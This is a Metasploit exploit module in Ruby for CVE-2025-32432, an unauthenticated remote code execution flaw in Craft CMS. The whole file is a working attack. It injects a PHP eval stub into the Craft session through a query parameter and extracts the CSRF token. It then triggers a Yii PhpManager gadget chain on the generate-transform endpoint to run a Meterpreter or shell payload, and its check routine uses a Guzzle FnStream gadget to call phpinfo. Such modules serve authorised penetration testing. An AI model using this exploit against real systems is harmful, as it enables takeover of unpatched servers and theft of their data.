##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Payload::Php
  prepend Msf::Exploit::Remote::AutoCheck

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Craft CMS Image Transform Preauth RCE (CVE-2025-32432)',
        'Description' => %q{
          This module exploits an unauthenticated remote code execution vulnerability
          in Craft CMS versions 3.x, 4.x, and 5.x < 5.6.17 via the image transform endpoint.
          It injects a PHP Meterpreter payload into the Craft session, then triggers its execution
          by abusing the Yii behavior gadget chain (PhpManager) on the generate-transform endpoint.

          Discovered in the wild by Orange Cyberdefense CSIRT and assigned CVE-2025-32432.
        },
        'Author' => [
          'Nicolas Bourras (Orange Cyberdefense)', # Research + PoC
          'Valentin Lobstein'                      # Metasploit module
        ],
        'License' => MSF_LICENSE,
        'References' => [
          [ 'CVE', '2025-32432' ],
          [ 'URL', 'https://sensepost.com/blog/2025/investigating-an-in-the-wild-campaign-using-rce-in-craftcms/' ],
          [ 'URL', 'https://blog.onyphe.io/en/cve-2025-32432-0day-craft-cms-discovered-by-orange-cyberdefense/' ]
        ],
        'Platform' => %w[php unix linux],
        'Arch' => [ARCH_PHP, ARCH_CMD],
        'Targets' => [
          [
            'PHP In-Memory',
            {
              'Platform' => 'php',
              'Arch' => ARCH_PHP
            }
          ],
          [
            'Unix/Linux Command Shell',
            {
              'Platform' => %(unix linux),
              'Arch' => ARCH_CMD
            }
          ],
        ],
        'Privileged' => false,
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [REPEATABLE_SESSION],
          'SideEffects' => [IOC_IN_LOGS]
        },
        'DisclosureDate' => '2025-04-14',
        'DefaultTarget' => 0
      )
    )

    register_options(
      [
        OptString.new('TARGETURI', [ true, 'Base path', '/' ]),
        OptInt.new('ASSET_ID', [true, 'Existing asset ID', Rex::Text.rand_text_numeric(2..3)])
      ]
    )
  end

  def check
    csrf = fetch_cookies_and_csrf
    return CheckCode::Unknown('Could not retrieve cookies & CSRF') unless csrf

    vprint_status("Using CSRF token: #{csrf}")

    res = send_transform(csrf, datastore['ASSET_ID'], 'phpinfo')
    return CheckCode::Unknown('No response from generate-transform') unless res

    if res.body.include?('If you did not receive a copy of the PHP license')
      return CheckCode::Vulnerable('License text detected')
    end

    CheckCode::Safe('License text not detected')
  end

  def php_exec_cmd(encoded_payload)
    vars = Rex::RandomIdentifier::Generator.new
    dis = '$' + vars[:dis]
    encoded_clean_payload = Rex::Text.encode_base64(encoded_payload)
    shell = <<-END_OF_PHP_CODE
            #{php_preamble(disabled_varname: dis)}
            $c = base64_decode("#{encoded_clean_payload}");
            #{php_system_block(cmd_varname: '$c', disabled_varname: dis)}
    END_OF_PHP_CODE
    return shell
  end

  def exploit
    phped_payload = target['Arch'] == ARCH_PHP ? payload.encoded : php_exec_cmd(payload.encoded)
    final_payload = framework.encoders.create('php/base64').encode(phped_payload)

    random_param_name = Rex::Text.rand_text_alphanumeric(5..12)

    first_payload = "<?=eval(\$_GET[\"#{random_param_name}\"]);die()?>"

    print_status('Making initial request to push payload and get a CSRF token..')

    craft_session_id, csrf = fetch_cookies_and_csrf(first_payload)
    vprint_status("CraftSessionId: #{craft_session_id}")
    vprint_status("Found CSRF token: #{csrf}")

    print_status('Triggering code via assets/generate-transform')

    json_data = {
      'assetId' => datastore['ASSET_ID'],
      'handle' => {
        'width' => Rex::Text.rand_text_alphanumeric(100..500),
        'height' => Rex::Text.rand_text_alphanumeric(100..500),
        'as hack' => {
          'class' => 'craft\\behaviors\\FieldLayoutBehavior',
          '__class' => 'yii\\rbac\\PhpManager',
          '__construct()' => [
            {
              'itemFile' => "/var/lib/php/sessions/sess_#{craft_session_id}"
            }
          ]
        }
      }
    }.to_json

    send_request_cgi({
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, 'index.php'),
      'vars_get' => { 'p' => 'actions/assets/generate-transform', random_param_name => final_payload },
      'headers' => { 'X-CSRF-Token' => csrf },
      'ctype' => 'application/json',
      'data' => json_data,
      'keep_cookies' => true
    })
  end

  def fetch_cookies_and_csrf(payload_param = nil)
    vars_get = { 'p' => 'admin/dashboard' }
    random_param_name = Rex::Text.rand_text_alphanumeric(5..12)
    vars_get[random_param_name] = payload_param if payload_param

    query_string = vars_get.map { |key, value| "#{key}=#{value}" }.join('&')

    opts = {
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path, 'index.php') + '?' + query_string
    }

    res1 = send_request_raw(opts)

    craft_session_id = res1.headers['Set-Cookie'].split(';').find { |cookie| cookie.strip.start_with?('CraftSessionId=') }&.split('=')&.last&.strip
    return nil unless craft_session_id

    opts2 = {
      'method' => 'GET',
      'uri' => res1.headers['Location'],
      'keep_cookies' => true
    }

    res2 = send_request_cgi(opts2)

    return nil unless res2&.code == 200

    csrf = res2.get_html_document.at('//input[@name="CRAFT_CSRF_TOKEN"]/@value')&.text
    return nil unless csrf

    payload_param ? [craft_session_id, csrf] : csrf
  end

  def send_transform(csrf, asset_id, php_string)
    json_data = {
      'assetId' => asset_id,
      'handle' => {
        'width' => Rex::Text.rand_text_alphanumeric(100..500),
        'height' => Rex::Text.rand_text_alphanumeric(100..500),
        'as session' => {
          'class' => 'craft\\behaviors\\FieldLayoutBehavior',
          '__class' => 'GuzzleHttp\\Psr7\\FnStream',
          '__construct()' => [
            []
          ],
          '_fn_close' => php_string
        }
      }
    }.to_json

    send_request_cgi(
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, 'index.php'),
      'vars_get' => { 'p' => 'admin/actions/assets/generate-transform' },
      'ctype' => 'application/json',
      'headers' => { 'X-CSRF-Token' => csrf },
      'data' => json_data
    )
  end
end
